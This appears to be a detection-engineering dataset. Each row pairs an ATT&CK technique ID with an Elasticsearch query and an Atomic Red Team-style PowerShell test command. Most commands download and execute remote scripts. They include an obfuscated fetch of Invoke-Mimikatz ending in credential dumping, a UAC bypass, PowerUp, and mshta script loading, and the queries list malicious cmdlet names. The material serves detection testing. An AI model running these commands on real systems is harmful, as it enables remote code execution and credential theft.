T1204.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-Maldoc""}},
                {""match_phrase"": {""CommandLine"": ""ExecChrome""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": "" Start-Process""}},
                 {""match_phrase"": {""CommandLine"": "" Notepad.exe""}},
                {""match_phrase"": {""CommandLine"": ""Receive-Job""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$job = Start-Job -ScriptBlock {
  $username = '#{host.user.name}';
  $password = '#{host.user.password}';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;
};
Receive-Job -Job $job -Wait;",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-AppPathBypass""}},
                {""match"": {""CommandLine"": ""-Payload""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""",2
T1204.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                               {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
                               {""match"": {""CommandLine"": ""shell""}},
                                {""match"": {""CommandLine"": ""choice""}},
                                {""match"": {""CommandLine"": ""vbNormalFocus""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); $macrocode = ""  a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""; 
Invoke-MalDoc -macroCode $macrocode -officeProduct ""Word""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": "" \\Software\\Microsoft\\Notepad""}},
                {""match_phrase"": {""CommandLine"": ""invoke-mimikatz""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';
$wshell=New-Object -ComObject WScript.Shell;
$reg='HKCU:\Software\Microsoft\Notepad';
$app='Notepad';
$props=(Get-ItemProperty $reg);
[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');
@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};
$curpid=$wshell.Exec($app).ProcessID;
While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};
While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};
$wshell.SendKeys('^o');
Start-Sleep -Milliseconds 500;
@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};
$res=$Null;
While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();
@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};
Start-Sleep -Milliseconds 500;
$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();
@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};
If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};
@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};
IEX($res);invoke-mimikatz -dumpcr",0
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": "" Add-Content -Path""}},
                {""match_phrase"": {""CommandLine"": ""Invoke-Expression""}},
                {""match_phrase"": {""CommandLine"": ""Get-Content -Path""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]) { ; }
else {Write-Host Prereq's for this test cannot be met automatically};  ;  
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'; 
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'; 
Invoke-Expression $streamcommand",1
T1204.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
                {""match"": {""CommandLine"": ""Shell""}},
                 {""match"": {""CommandLine"": ""Open""}},
                 {""match"": {""CommandLine"": ""vbNormalFocus""}},
                 {""wildcard"": {""CommandLine"": ""*.jse""}}

            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
$macrocode = ""   Open `""C:\Users\Public\art.jse`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   
a = Shell(`""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`"", vbNormalFocus)`n""; 
Invoke-MalDoc -macroCode $macrocode -officeProduct ""Word""",2
T1204.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""cscript*""}},
                 {""wildcard"": {""CommandLine"": ""request*""}},
                  {""wildcard"": {""CommandLine"": ""stream*""}},
                     {""wildcard"": {""CommandLine"": ""*.js""}},
                {""match_phrase"": {""CommandLine"": ""//E:Jscript""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; 
request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); 
request.open('GET', url, false);
request.send(); 
if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); 
stream.Open(); 
stream.Type = 1;
stream.Write(request.responseBody); 
stream.Position = 0;
stream.SaveToFile(filename, 1); 
stream.Close();
} else {WScript.Quit(1);
}WScript.Quit(0); 
> %TEMP%\OSTapGet.js 
&& cscript //E:Jscript %TEMP%\OSTapGet.js",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.InvokeCommand""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); 
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); 
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';
Set-Item Variable:\gH 'Default_File_Path.ps1';
ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods
|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?
{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);
(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))",2
T1204.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""PotentiallyUnwanted.exe""}},
                {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe;
& ""$env:TEMP/PotentiallyUnwanted.exe""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""-version 2""}},
                {""match"": {""CommandLine"": ""powershell""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { ; } else {Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually};  ; 
powershell.exe -version 2 -Command Write-Host $PSVersion",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                {""match_phrase"": {""CommandLine"": ""Software\\Classes\\""}},
                  {""match"": {""CommandLine"": ""add""}},
                  {""match"": {""CommandLine"": ""ART""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=""; 
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))",
T1059.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[{""match_phrase"":{""CommandLine"": ""Write-Host""}}                ]
     }
    },
    {""bool"":{
     ""should"":[
                       {""match_phrase"":{""CommandLine"": ""Add-Persistence""}},
                        {""match_phrase"":{""CommandLine"": ""Find-AVSignature""}},
                       {""match_phrase"":{""CommandLine"": ""Get-GPPAutologon""}},
                       {""match_phrase"":{""CommandLine"": ""Get-GPPPassword""}},
                       {""match_phrase"":{""CommandLine"": ""Get-HttpStatus""}},
                       {""match_phrase"":{""CommandLine"": ""Get-Keystrokes""}},
                        {""match_phrase"":{""CommandLine"": ""Get-SecurityPackages""}},
                        {""match_phrase"":{""CommandLine"": ""Get-TimedScreenshot""}},
                        {""match_phrase"":{""CommandLine"": ""Get-VaultCredential""}},
                        {""match_phrase"":{""CommandLine"": ""Get-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Install-SSP""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-CredentialInjection""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-DllInjection""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-Mimikatz""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-NinjaCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-Portscan""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-ReflectivePEInjection""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-ReverseDnsLookup""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-Shellcode""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-TokenManipulation""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-WmiCommand""}},
                        {""match_phrase"":{""CommandLine"": ""Mount-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""New-ElevatedPersistenceOption""}},
                        {""match_phrase"":{""CommandLine"": ""New-UserPersistenceOption""}},
                        {""match_phrase"":{""CommandLine"": ""New-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Out-CompressedDll""}},
                        {""match_phrase"":{""CommandLine"": ""Out-EncodedCommand""}},
                        {""match_phrase"":{""CommandLine"": ""Out-EncryptedScript""}},
                        {""match_phrase"":{""CommandLine"": ""Out-Minidump""}},
                        {""match_phrase"":{""CommandLine"": ""PowerUp""}},
                        {""match_phrase"":{""CommandLine"": ""PowerView""}},
                        {""match_phrase"":{""CommandLine"": ""Remove-Comments""}},
                        {""match_phrase"":{""CommandLine"": ""Remove-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Set-CriticalProcess""}},
                        {""match_phrase"":{""CommandLine"": ""Set-MasterBootRecord""}}
                              ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$malcmdlets = ""Add-Persistence"", ""Find-AVSignature"", ""Get-GPPAutologon"", ""Get-GPPPassword"",""Get-HttpStatus"", ""Get-Keystrokes"", ""Get-SecurityPackages"", ""Get-TimedScreenshot"", ""Get-VaultCredential"", ""Get-VolumeShadowCopy"", ""Install-SSP"", ""Invoke-CredentialInjection"", ""Invoke-DllInjection"", ""Invoke-Mimikatz"", ""Invoke-NinjaCopy"", ""Invoke-Portscan"", ""Invoke-ReflectivePEInjection"", ""Invoke-ReverseDnsLookup"", ""Invoke-Shellcode"", ""Invoke-TokenManipulation"", ""Invoke-WmiCommand"", ""Mount-VolumeShadowCopy"", ""New-ElevatedPersistenceOption"", ""New-UserPersistenceOption"", ""New-VolumeShadowCopy"", ""Out-CompressedDll"", ""Out-EncodedCommand"", ""Out-EncryptedScript"", ""Out-Minidump"", ""PowerUp"", ""PowerView"", ""Remove-Comments"", ""Remove-VolumeShadowCopy"", ""Set-CriticalProcess"", ""Set-MasterBootRecord""; 
foreach ($cmdlets in $malcmdlets) {;
     ""function $cmdlets { Write-Host Pretending to invoke $cmdlets }""}; 
foreach ($cmdlets in $malcmdlets) {;
     $cmdlets}",2
T1059.001,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[{""match_phrase"":{""CommandLine"": ""T1086_PowerShell_Session_Creation_and_Use""}}                ]
     }
    },
    {""bool"":{
     ""should"":[ 
{""match_phrase"": {""CommandLine"": ""New-PSSession""}},
                {""match_phrase"": {""CommandLine"": ""Test-Connection""}},
                 {""match_phrase"": {""CommandLine"": ""Set-Content""}},
                 {""match_phrase"": {""CommandLine"": ""Get-Conten""}},
                 {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
                              ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Try {;     New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; } ; 
Catch {;     Enable-PSRemoting; };  ; 
New-PSSession -ComputerName $env:COMPUTERNAME; 
Test-Connection $env:COMPUTERNAME; 
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value ""T1086 PowerShell Session Creation and Use""; 
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use; 
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""downloadstring""}},
                 {""match_phrase"": {""CommandLine"": ""https://bit.ly/33H0QXi""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(""https://bit.ly/33H0QXi"")",1
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Invoke-AllChecks""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); 
Invoke-AllChecks",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""noprofile""}},
                {""match"": {""CommandLine"": ""ServerXmlHttp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.Load""}},
                 {""wildcard"": {""CommandLine"": ""*.command.a.execute""}},
                 {""match_phrase"": {""CommandLine"": ""IEX""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec 
bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);
$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');
$Xml.command.a.execute | IEX""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*sct""}},
                 {""match"": {""CommandLine"": ""mshta""}},
                {""match"": {""CommandLine"": ""javascript""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\Windows\system32\cmd.exe /c ""mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()""",2
